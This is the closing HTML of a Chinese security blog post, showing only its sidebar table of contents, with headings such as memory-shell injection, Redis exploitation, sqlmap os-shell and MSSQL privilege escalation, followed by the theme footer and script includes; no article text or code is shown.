class="nav-number">24.2.</span> <span class="nav-text">Filter型内存马注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#redis利用方式"><span class="nav-number">25.</span> <span class="nav-text">redis利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口映射和端口转发"><span class="nav-number">26.</span> <span class="nav-text">端口映射和端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#给你一个网站你怎么测试"><span class="nav-number">27.</span> <span class="nav-text">给你一个网站你怎么测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python-new和init的区别"><span class="nav-number">28.</span> <span class="nav-text">python new和init的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap-os-shell的原理"><span class="nav-number">29.</span> <span class="nav-text">sqlmap os-shell的原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mssql-提权"><span class="nav-number">30.</span> <span class="nav-text">mssql 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xp-cmdshell"><span class="nav-number">30.1.</span> <span class="nav-text">xp_cmdshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sp-oacreate"><span class="nav-number">30.2.</span> <span class="nav-text">sp_oacreate</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#勒索病毒应急响应"><span class="nav-number">31.</span> <span class="nav-text">勒索病毒应急响应</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">irrik</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">202k</span>
  
</div>


  <div class="powered-by">
	<i class="fa fa-user-md"></i>
	<span id="busuanzi_container_site_uv">
		本站访客数:<span id="busuanzi_value_site_uv"></span>
	</span>
	<span class="post-meta-divider">|</span>
	<span id="busuanzi_container_site_pv">
		本站访问量<span id="busuanzi_value_site_pv"></span>
	</span>
</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
